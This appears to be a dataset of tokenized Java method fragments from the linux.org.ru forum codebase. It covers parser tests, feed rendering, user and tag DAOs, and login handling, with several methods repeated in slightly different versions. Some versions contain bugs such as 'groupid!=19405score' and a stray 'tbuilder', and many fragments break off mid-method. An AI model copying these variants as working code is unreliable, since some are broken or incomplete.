private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; if ( minimizeCut ) { try { LorURL lorCutURL = new LorURL ( siteConfig . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , true , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public RootNode createRootNode ( ) { return new RootNode ( parserParameters ) ; } 
private String parse ( String text ) { return DEFAULT_PARSER . parseRoot ( DEFAULT_PARSER . createRootNode ( ) , text ) . renderXHtml ( ) ; } 
public void codeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , parse ( " [code][list][*]one[*]two[*]three[/list][/code] " ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , parse ( " [code] nsimple code[/code] " ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , 
public void codeSpacesTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[url]test[/url] [url]test[/url]</code></pre></div> " , 
public void codeCleanTest ( ) { assertEquals ( " " , parse ( " [code][/code] " ) ) ; } 
public void codeKnowTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , parse ( " [code=cxx]#include <stdio.h>[/code] " ) ) ; 
public void codeUnKnowTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , parse ( " [code=foo]#include <stdio.h>[/code] " ) ) ; 
protected void renderMergedOutputModel ( Map model , HttpServletRequest request , HttpServletResponse response ) throws Exception { SyndFeed feed = new SyndFeedImpl ( ) ; feed . setEncoding ( " utf-8 " ) ; String feedType = ( String ) model . get ( " feed-type " ) ; if ( Strings . isNullOrEmpty ( feedType ) ) { feedType = " rss " ; } feed . setFeedType ( feedTypes . get ( feedType ) ) ; createFeed ( feed , model ) ; response . setContentType ( contentTypes . get ( feedType ) ) ; response . setCharacterEncoding ( " UTF-8 " ) ; SyndFeedOutput output = new SyndFeedOutput ( ) ; output . output ( feed , response . getWriter ( ) ) ; } 
public String encode ( CharSequence rawPassword ) { return encryptor . encryptPassword ( rawPassword . toString ( ) ) ; } 
public boolean matches ( CharSequence rawPassword , String encodedPassword ) { return encryptor . checkPassword ( rawPassword . toString ( ) , encodedPassword ) ; } 
public boolean isCommentEditableNow ( @Nonnull Comment comment , @Nullable User currentUser , boolean haveAnswers , @Nonnull Topic topic ) { Errors errors = new MapBindingResult ( ImmutableMap . of ( ) , " obj " ) ; checkCommentsAllowed ( topic , currentUser , errors ) ; checkCommentEditableNow ( comment , currentUser , haveAnswers , topic , errors ) ; return ! errors . hasErrors ( ) ; } 
public String format ( String text , boolean secure , boolean nofollow , RuTypoChanger changer ) { String escapedText = StringUtil . escapeHtml ( text ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken = formatURL ( token , secure , nofollow , changer ) ; sb . append ( formattedToken ) ; } return sb . toString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
public void encodeLorUrl ( ) { assertEquals ( " <p><a href= \" http:www.linux.org.ru/forum/linux%3C%3E-org-ru/ \" >www.linux.org.ru/forum/linux&lt;&gt;-org-ru/</a></p> " , 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and groupid!=19405score and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and groupid!=19405 and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } return ! canmod ; } 
public List < Image > imageByFile ( String path ) { return jdbcTemplate . query ( " SELECT id, topic, original, icon FROM images WHERE original=? " , 
public String handle403 ( ) { return " errors/code403 " ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < PreparedGalleryItem > list = imageService . prepare ( imageService . getGalleryItems ( COUNT_ITEMS ) ) ; mav . addObject ( " items " , list ) ; return mav ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < PreparedGalleryItem > list = imageService . prepareGalleryItem ( imageService . getGalleryItems ( COUNT_ITEMS ) ) ; mav . addObject ( " items " , list ) ; return mav ; } 
public Screenshot moveTo ( File dir , String name ) throws IOException { Screenshot dest = new Screenshot ( name , dir , extension ) ; Files . move ( mainFile . toPath ( ) , dest . mainFile . toPath ( ) ) ; Files . move ( iconFile . toPath ( ) , dest . iconFile . toPath ( ) ) ; Files . move ( mediumFile . toPath ( ) , dest . mediumFile . toPath ( ) ) ; Files . move ( medium2xFile . toPath ( ) , dest . medium2xFile . toPath ( ) ) ; return dest ; } 
void doResize ( File uploadedFile ) throws IOException , BadImageException { Files . move ( uploadedFile . toPath ( ) , mainFile . toPath ( ) , StandardCopyOption . REPLACE_EXISTING ) ; boolean error = true ; try { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
private File processUploadImage ( HttpServletRequest request ) throws IOException , ScriptErrorException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " lor-image- " , " " ) ; logger . debug ( " Transfering upload to: " + uploadedFile ) ; multipartFile . transferTo ( uploadedFile ) ; return uploadedFile ; } } return null ; } 
public ElasticClient elasticsearch ( ) { Client mockClient = Mockito . mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . thenThrow ( new ElasticsearchException ( " no ES here " ) ) ; return ElasticClient . fromClient ( mockClient ) ; } 
public void prefixSearchExactTest ( ) { tagDao . createTag ( " zest " ) ; tagDao . createTag ( " zesd " ) ; scala . collection . Seq < TagInfo > tags = tagDao . getTagsByPrefix ( " zest " , 0 ) ; assertEquals ( 1 , tags . size ( ) ) ; } 
public void prefixSearchSimpleTest ( ) { int zest = tagDao . createTag ( " zest " ) ; int zesd = tagDao . createTag ( " zesd " ) ; scala . collection . Seq < TagInfo > tags = tagDao . getTagsByPrefix ( " ze " , 0 ) ; assertEquals ( 2 , tags . size ( ) ) ; assertEquals ( zesd , tags . apply ( 0 ) . id ( ) ) ; assertEquals ( zest , tags . apply ( 1 ) . id ( ) ) ; } 
public void testRelatedTags ( ) { scala . collection . Seq < String > tags = tagDao . relatedTags ( 30 ) ; assertNotNull ( tags ) ; } 
private ModelAndView mainTopicsFeedHandler ( Section section , HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response , @Nullable Group group ) throws Exception { checkRequestConditions ( section , group , topicListForm ) ; Template tmpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-news " ) ; modelAndView . addObject ( " group " , group ) ; modelAndView . addObject ( " url " , " view-news.jsp " ) ; modelAndView . addObject ( " section " , section ) ; modelAndView . addObject ( " archiveLink " , section . getArchiveLink ( ) ) ; setExpireHeaders ( response , topicListForm . getYear ( ) , topicListForm . getMonth ( ) ) ; modelAndView . addObject ( " navtitle " , calculateNavTitle ( section , group , topicListForm ) ) ; topicListForm . setOffset ( topicListService . fixOffset ( topicListForm . getOffset ( ) ) ) ; List < Topic > messages = topicListService . getTopicsFeed ( section , group , null , topicListForm . getOffset ( ) , topicListForm . getYear ( ) , topicListForm . getMonth ( ) , 20 ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ) ; modelAndView . addObject ( " offsetNavigation " , topicListForm . getMonth ( ) = = null ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , topicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=3 " ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , topicListForm ) ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=2 " ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , topicListForm ) ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , topicListForm ) ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=1 " ) ; return modelAndView ; } 
public ModelAndView galleryGroup ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( Section . SECTION_GALLERY ) ; return group ( section , request , topicListForm , groupName , response ) ; } 
public ModelAndView newsGroup ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( Section . SECTION_NEWS ) ; return group ( section , request , topicListForm , groupName , response ) ; } 
public ModelAndView pollsGroup ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( Section . SECTION_POLLS ) ; return group ( section , request , topicListForm , groupName , response ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { TopicListRequest topicListForm = new TopicListRequest ( ) ; Section sectionObject = sectionService . getSectionByName ( section ) ; if ( sectionObject . isPremoderated ( ) ) { topicListForm . setYear ( year ) ; 
private ModelAndView group ( Section section , HttpServletRequest request , TopicListRequest topicListForm , String groupName , HttpServletResponse response ) throws Exception { Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , topicListForm , response , group ) ; modelAndView . addObject ( " ptitle " , section . getName ( ) + " - " + group . getTitle ( ) ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; return modelAndView ; } 
public ModelAndView topics ( HttpServletRequest request , @PathVariable ( " section " ) String sectionName , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { Section section = sectionService . getSectionByName ( sectionName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( section , request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( section , topicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=3 " ) ; return modelAndView ; } 
public ModelAndView topicsByGroup ( @PathVariable ( " section " ) String sectionName , HttpServletRequest request , TopicListRequest topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return group ( section , request , topicListForm , groupName , response ) ; } 
public boolean hasSimilarUsers ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) FROM users WHERE " + " NOT blocked AND score>100 AND lastlogin<CURRENT_TIMESTAMP-'3 years'::INTERVAL " + " AND levenshtein_less_equal(lower(nick), ?, 1)<=1 " , Integer . class , nick ) ; return c > 0 ; } 
public boolean hasSimilarUsers ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) FROM users WHERE " + " NOT blocked AND score>=200 AND lastlogin>CURRENT_TIMESTAMP-'3 years'::INTERVAL " + " AND levenshtein_less_equal(lower(nick), ?, 1)<=1 " , Integer . class , nick ) ; return c > 0 ; } 
public boolean hasSimilarUsers ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) FROM users WHERE " + " NOT blocked AND score>=200 AND lastlogin>CURRENT_TIMESTAMP-'3 years'::INTERVAL " + " AND levenshtein_less_equal(lower(nick), ?, 1)<=1 " , Integer . class , nick . toLowerCase ( ) ) ; return c > 0 ; } 
public ModelAndView loginProcess ( @RequestParam ( " nick " ) final String username , @RequestParam ( " passwd " ) final String password , HttpServletRequest request , HttpServletResponse response ) throws Exception { UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken ( username , password ) ; try { UserDetailsImpl details = ( UserDetailsImpl ) userDetailsService . loadUserByUsername ( username ) ; 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarks ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public int countIgnore ( int tagId ) { return jdbcTemplate . queryForObject ( " SELECT count(*) FROM user_tags WHERE tag_id=:tagId AND NOT is_favorite " , 
public int ignoreAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagService . getTagId ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagService . getTagId ( tagName ) , false ) ; return tagId ; } 
public int ignoreDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagService . getTagId ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagService . getTagId ( tagName ) , false ) ; return tagId ; } 
public int countIgnore ( int id ) { return userTagDao . countIgnore ( id ) ; } 
public void updateUser ( @Nonnull User user , String name , String url , @Nullable String newEmail , String town , @Nullable String password , String info ) { jdbcTemplate . update ( " UPDATE users SET name=?, url=?, town=? WHERE id=? " , name , url , town , user . getId ( ) ) ; if ( newEmail ! = null ) { jdbcTemplate . update ( " UPDATE users SET new_email=? WHERE id=? " , newEmail , user . getId ( ) ) ; } if ( password ! = null ) { setPassword ( user , password ) ; userLogDao . logSetPassword ( user ) ; } setUserInfo ( user . getId ( ) , info ) ; } 
public void updateMessage ( final int msgid , final boolean withComments ) { logger . info ( " Scheduling reindex # " + msgid + " withComments= " + withComments ) ; jmsTemplate . send ( queue , session - > { return session . createObjectMessage ( new UpdateMessage ( msgid , withComments ) ) ; 
public void updateMonth ( final int year , final int month ) { logger . info ( " Scheduling reindex by date " + year + '/' + month ) ; jmsTemplate . send ( queue , session - > { return session . createObjectMessage ( new UpdateMonth ( year , month ) ) ; 
public void updateComment ( final int msgid ) { Preconditions . checkArgument ( msgid ! = 0 , " msgid==0!? " ) ; jmsTemplate . send ( queue , session - > { return session . createObjectMessage ( new UpdateComments ( Collections . singletonList ( msgid ) ) ) ; 
public void updateComment ( final List < Integer > msgids ) { jmsTemplate . send ( queue , session - > { return session . createObjectMessage ( new UpdateComments ( msgids ) ) ; 
public ModelAndView logout ( HttpServletRequest request , HttpServletResponse response ) { Authentication auth = SecurityContextHolder . getContext ( ) . getAuthentication ( ) ; if ( auth ! = null ) { new SecurityContextLogoutHandler ( ) . logout ( request , response , auth ) ; } Cookie cookie = new Cookie ( " remember_me " , null ) ; cookie . setMaxAge ( 0 ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; return new ModelAndView ( new RedirectView ( " /login.jsp " ) ) ; } 
public ModelAndView logoutLink ( ) { if ( AuthUtil . isSessionAuthorized ( ) ) { return new ModelAndView ( new RedirectView ( " /people/ " + AuthUtil . getNick ( ) + " /profile " ) ) ; 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; tbuilder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , true ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive" ); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , true ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive" ); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public void updateMessage ( final int msgid , final boolean withComments ) { logger . info ( " Scheduling reindex # " + msgid + " withComments= " + withComments ) ; jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateMessage ( msgid , withComments ) ) ) ; } 
public void updateMonth ( final int year , final int month ) { logger . info ( " Scheduling reindex by date " + year + '/' + month ) ; jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateMonth ( year , month ) ) ) ; } 
public void updateComment ( final int msgid ) { Preconditions . checkArgument ( msgid ! = 0 , " msgid==0!? " ) ; jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateComments ( Collections . singletonList ( msgid ) ) ) ) ; } 
public void updateComment ( final List < Integer > msgids ) { jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateComments ( msgids ) ) ) ; } 
public void favoritesGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " tag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , true ) ) . thenReturn ( etalon ) ; List < String > actual = userTagService . favoritesGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . get ( 0 ) , actual . get ( 0 ) ) ; } 
public void ignoresGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " tag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , false ) ) . thenReturn ( etalon ) ; List < String > actual = userTagService . ignoresGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . get ( 0 ) , actual . get ( 0 ) ) ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { Collection < String > tags = tagService . suggestTagsByPrefix ( term , 10 ) ; return ImmutableList . copyOf ( Iterables . filter ( tags , Tag 
public MoreLikeThisService moreLikeThisService ( ) { return mock ( MoreLikeThisService . class ) ; } 
public ElasticClient elasticsearch ( ) { Client mockClient = mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . thenThrow ( new ElasticsearchException ( " no ES here " ) ) ; return ElasticClient . fromClient ( mockClient ) ; } 
public SearchQueueSender searchQueueSender ( ) { return mock ( SearchQueueSender . class ) ; } 
public ElasticClient elasticsearch ( ) { Client mockClient = mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . thenThrow ( new ElasticsearchException ( " no ES here " ) ) ; return ElasticClient$ . MODULE$ . fromClient ( mockClient ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) throws IllegalArgumentException { switch ( s ) { case " 1 " : for old links setValue(SearchOrder.Relevance$.MODULE$); break; case "2": setValue(SearchOrder.Date$.MODULE$); break; default: setValue(SearchOrder$.MODULE$.valueOf(s)); break; } } }); binder.registerCustomEditor(SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userService)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public StringHttpMessageConverter stringMessageConverter ( ) { return new StringHttpMessageConverter ( ) ; } 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , request , response , groupName , msgid ) ; 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , false ) ; } Topic topic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( topic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( topic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public ModelAndView loginProcess ( @RequestParam ( " nick " ) final String username , @RequestParam ( " passwd " ) final String password , HttpServletRequest request , HttpServletResponse response ) throws Exception { UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken ( username , password ) ; try { UserDetailsImpl details = ( UserDetailsImpl ) userDetailsService . loadUserByUsername ( username ) ; 
public Topic getById ( int id ) throws MessageNotFoundException { Topic message ; try { message = jdbcTemplate . queryForObject ( queryMessage , ( resultSet , i ) - > new Topic ( resultSet ) , id ) ; } catch ( EmptyResultDataAccessException exception ) { noinspection ThrowInsideCatchBlockWhichIgnoresCaughtException throw new MessageNotFoundException(id); } return message; } 
public int saveNewMessage ( final Topic msg , final User user , String text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; msgbaseDao . saveNewMessage ( text , msgid ) ; return msgid ; } 
public static Profile createDefault ( ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < > ( ) ) , null ) ; } 
public Profile readProfile ( @NotNull User user ) { List < Profile > profiles = jdbcTemplate . query ( " SELECT settings, main FROM user_settings WHERE id=? " , ( resultSet , i ) - > { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , Arrays . asList ( ( String [ ] ) boxes . getArray ( ) ) ) ; } else { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , null ) ; } } , user . getId ( ) ) ; if ( profiles . isEmpty ( ) ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < > ( ) ) , null ) ; 
public void writeProfile ( @Nonnull final User user , @Nonnull final Profile profile ) { String boxlets [ ] = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . toArray ( new String [ customBoxlets . size ( ) ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( con - > { 
private User getUserInternal ( int id ) throws UserNotFoundException { List < User > list = jdbcTemplate . query ( queryUserById , ( rs , rowNum ) - > new User ( rs ) , id ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
private void findURLIds ( ) throws URIException { if ( _true_lor_url ) { find message id in lor url 
public String toString ( ) { return parsed . getEscapedURIReference ( ) ; } 
public String fixScheme ( boolean secure ) throws URIException { if ( ! _true_lor_url ) { return toString ( ) ; } String host = parsed . getHost ( ) ; int port = parsed . getPort ( ) ; String path = parsed . getPath ( ) ; String query = parsed . getQuery ( ) ; String fragment = parsed . getFragment ( ) ; if ( ! secure ) { return ( new HttpURL ( null , host , port , path , query , fragment ) ) . getEscapedURIReference ( ) ; 
